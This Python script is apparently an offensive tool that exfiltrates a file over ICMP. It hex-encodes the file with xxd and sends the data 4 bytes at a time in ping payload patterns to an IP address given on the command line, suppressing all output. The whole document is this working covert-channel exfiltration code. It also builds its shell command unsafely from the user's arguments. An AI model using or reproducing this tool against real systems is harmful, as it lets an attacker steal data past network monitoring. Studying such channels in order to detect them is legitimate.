#!/usr/bin/env python3
import subprocess
import sys
import time
import signal
from colorama import Fore


def ctrl_c(signum, frame):
    get_colours("\n[*] Exiting the program...", "blue")
    time.sleep(1)
    exit(1)


signal.signal(signal.SIGINT, ctrl_c)


# Colours
def get_colours(text, color):
    if color == "green":
        green_color = Fore.GREEN + text
        print(green_color)
    elif color == "red":
        red_color = Fore.RED + text
        print(red_color)
    elif color == "blue":
        blue_color = Fore.BLUE + text
        print(blue_color)


def send_file(ip_address, file_name):
    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; done >/dev/null 2>&1"""
    get_colours("\n[+] Trying to send file...", 'blue')
    check_output = subprocess.run([file_load], shell=True, capture_output=True, text=True)
    if 'No such file or directory' in str(check_output):
        get_colours('\n[!] Indicate file not found, check file name.', 'red')
    else:
        get_colours("\n[+] File sent successfully.", 'green')


if len(sys.argv) != 3:
    print(f"\n{Fore.RED + '[!]'}", f"{Fore.WHITE + f'Usage {sys.argv[0]} <IP-Address> <File-Name>'}")
else:
    send_file(sys.argv[1], sys.argv[2])
